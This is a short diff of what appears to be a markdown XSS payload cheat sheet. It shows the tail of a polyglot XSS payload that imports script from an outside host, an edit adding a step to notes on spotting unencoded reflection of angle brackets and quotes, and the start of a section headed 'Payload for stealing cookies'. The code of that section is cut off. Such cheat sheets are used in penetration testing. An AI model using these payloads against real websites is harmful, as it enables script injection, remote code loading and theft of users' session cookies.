@@ -22,8 +22,9 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 /*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76
 ```
 **Note**
-  1. If < and > symbol reflecting in source code without encoding, XSS possible.
-  2. If ' or " symbol reflecting in source code without encoding, XSS possible.
+  1. Check html tag and attribute for reflection.
+  2. If < and > symbol reflecting in source code without encoding, XSS possible.
+  3. If ' or " symbol reflecting in source code without encoding, XSS possible.
 
 ## Payload for stealing cookies
 ```js
